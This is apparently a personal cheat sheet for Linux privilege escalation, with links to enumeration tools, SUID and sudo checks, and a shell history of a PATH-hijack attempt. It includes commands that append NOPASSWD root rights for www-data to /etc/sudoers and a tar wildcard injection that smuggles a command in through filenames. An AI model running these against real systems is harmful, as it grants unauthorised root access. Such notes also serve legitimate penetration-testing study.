-   [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   [linenum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
-`python3 -c 'import crypt; print(crypt.crypt("test", crypt.mksalt(crypt.METHOD_SHA512)))'`
- `echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
- https://payatu.com/guide-linux-privilege-escalation

1. SUID / GUID
	2. `find / -perm /4000 2> /dev/null | grep bin`
	3. `find / -perm /2000 2> /dev/null | grep bin`
	4. [gtfobins (privesc)](https://gtfobins.github.io)
2. file permission misconfigurations
	1. `ls -l /etc/passwd /etc/shadow /etc/sudoers`
3. sudo permissions
	1. `sudo -l`
4. cron 
	1. /etc/crontab
5. .ssh folders in home dirs
	1. `ls -la /home/*`
6. tar wildcards
```bash
echo "" > --checkpoint=1
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > shell.sh
```


    1  ls
    2  menu
    3  menu 
    4  pwd
    5  mkdir bin
    6  cd bin
    7  ls
    8  vi ifconfig
    9  chmod +x ifconfig 
   10  ./ifconfig 
   11  vi ifconfig 
   12  ./ifconfig 
   13  ls
   14  cat test 
   15  $PATH
   16  ifconfig 
   17  ls
   18  cat test 
   19  menu
   20  ls
   21  cat test 
   22  vi ifconfig 
   23  menu
   24  cat test 
   25  vi ifconfig 
   26  menu
   27  sudo -l
   28  sudo su
   29  history
